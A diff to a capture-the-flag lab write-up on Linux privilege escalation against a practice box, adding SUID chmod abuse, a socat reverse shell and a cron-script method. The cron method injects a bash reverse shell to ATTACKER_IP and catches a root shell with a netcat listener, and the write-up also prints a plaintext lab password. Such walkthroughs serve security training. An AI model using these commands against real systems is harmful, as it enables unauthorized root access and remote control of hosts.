@@ -462,6 +462,8 @@ www-data
 ```
 #### Stabilise netcat shell
 ```
+export TERM=xterm
+export SHELL=bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 ## Privilege Escalation
@@ -489,34 +491,59 @@ find / -user elyana -type f 2>/dev/null
 ```
 * "/etc/mysql/conf.d/private.txt" is readable by "www-data" and contains credentials.
 ```
-ls -la /etc/mysql/conf.d/pricate.txt
+ls -la /etc/mysql/conf.d/private.txt
 -rwxrwxrwx 1 elyana elyana   34 Oct  5  2020 private.txt
 
 cat /etc/mysql/conf.d/private.txt 
 user: elyana
 password: E@syR18ght
 ```
-**Credentials allow SSH access to target host**
+#### Recover /home/elyana/user.txt**
+**Check all binaries owned by root with SUID bit set method**
+```
+find / -user root -perm /4000 -ls 2>/dev/null
+
+-rwsr-sr-x 1 root root 1.1M Jun 6 2019 /bin/bash
+-rwsr-sr-x 1 root root 59K Jan 18 2018 /bin/chmod
+-rwsr-sr-x 1 root root 392K Apr 4 2018 /usr/bin/socat
+```
+* Checked [GTFOBins](https://gtfobins.github.io/gtfobins/chmod/#suid) for information on how a user with SUID bit set on chmod can abuse it.
+> **SUID**. If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges. This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
+> `sudo install -m =xs $(which chmod) .`
+> LFILE=file_to_change
+> ./chmod 6777 $LFILE
+```
+LFILE="/home/elyana/user.txt"
+/bin/chmod 6777 $LFILE
+cat /home/elyana/user.txt | base64 -d
+```
+**Use SSH method**
+* Credentials allow SSH access to target host.
 ```
 ssh elyana@10.10.199.13
 elyana@10.10.199.13's password: 
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)
 [snip ...]
 ```
+* Recover /home/elyana/user.txt**
+```
+cat /home/elyana/user.txt | base64 -d
+```
+#### Find root.txt
+```
+find / -name root.txt 2>/dev/null
+/root/root.txt
+
+ls -la /root/root.txt
+ls: cannot access '/root/root.txt': Permission denied
+```
+### Escalate privileges to root
+* Elyana user is member of sudo and lxd groups
 ```
 id
 uid=1000(elyana) gid=1000(elyana) groups=1000(elyana),4(adm),27(sudo),108(lxd)
 ```
-* Elyana user is member of sudo and lxd groups.
 > LXD (pronounced lex-dee) is the lightervisor, or lightweight container hypervisor. LXC (lex-see) is a program which creates and administers “containers” on a local system. It also provides an API to allow higher level managers, such as LXD, to administer containers.
-**Recover /home/elyana/user.txt**
-```
-cat /home/elyana/user.txt
-VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259
-```
-* Decoded Base64 string in CyberChef.
-
-### Escalate privileges to root
 #### Sudo socat abuse method
 * Elyana user has delegated privileges on "/usr/bin/socat".
 ```
@@ -536,7 +563,7 @@ whoami
 root
 ```
 #### Socat reverse shell method
-**Create fully stable Linux tty reverse shell**
+**Create Linux tty reverse shell**
 * On attack host.
 ```
 socat TCP-L:2345 FILE:`tty`,raw,echo=0
@@ -587,19 +614,60 @@ chmod +x ./linpeas.txt
 whoami
 root
 ```
+#### Cronjob method
+* Writable "/var/backups/script.sh" bash script owned by root.
+* Script runs every minute. 
+```
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
 
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
-**Find root.txt**
+#  m h dom mon dow user	command
+17 *	*   *   *  root	 cd / && run-parts --report /etc/cron.hourly
+25 6	*   *   *  root	 test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	*   *   7  root	 test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1   *   *  root	 test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*  *    *   *   *  root  /var/backups/script.sh
+
+ls -la /var/backups/script.sh 
+-rwxrwxrwx 1 root root 73 Oct  7  2020 /var/backups/script.sh
+
+cat /var/backups/script.sh 
+#!/bin/bash
+
+#Just a test script, might use it later to for a cron task
 ```
-find / -name root.txt 2>/dev/null
-/root/root.txt
+**Copy root.txt to readable directory method**
+* Change code in script.
 ```
-**Recover root.txt**
+cp /root/root.txt /tmp/root.txt
 ```
-cat /root/root.txt
-VEhNe3VlbTJ3aWdidWVtMndpZ2I2OHNuMmoxb3NwaTg2OHNuMmoxb3NwaTh9
+``` 
+cat /root/root.txt | base64 -d
 ```
-**Decode base64**
+**Inject reverse shell code into script method**
 ```
+#!/bin/bash
+bash -i >& /dev/tcp/ATTACKER_IP/9002 0>&1
+```
+* Start listener on attack host.
+```
+nc -lvnp 9002
+```
+* Reverse shell caught by listener.
+```
+Connection from TARGET_IP 40486 received!
+bash: cannot set terminal process group (19133): Inappropriate ioctl for device
+bash: no job control in this shell
+whoami
+root
+id
+uid=0(root) gid=0(root) groups=0(root)
 cat /root/root.txt | base64 -d
 ```
